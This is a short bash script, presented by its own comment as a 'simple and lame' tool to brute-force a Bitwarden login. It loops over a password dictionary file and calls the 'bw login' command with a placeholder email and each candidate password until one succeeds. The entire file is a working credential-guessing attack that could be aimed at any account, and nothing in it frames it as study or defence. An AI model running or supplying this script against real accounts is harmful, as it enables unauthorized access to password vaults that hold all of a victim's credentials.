#!/bin/bash
#
# A simple and lame script to brute force Bitwarden login
# using a password dictionary file.
#

bw_login="CHANGE@ME.COM"
source_file="/tmp/password_list.txt"
process_file=/tmp/pwd_list.txt

if test -f "$process_file"; then echo "$process_file exists."; fi

< $source_file grep -Ev "^#|^$" >> $process_file

for i in $(cat $process_file);
  do
    echo "bw login $bw_login $i"
    bw login "$bw_login" "$i"
    rc=$?
    if [ $rc -ne 0 ]; then
        echo "fail"
	continue
    else
        echo "SUCCESS !!!"
	break;
    fi;
  done;

rm $process_file
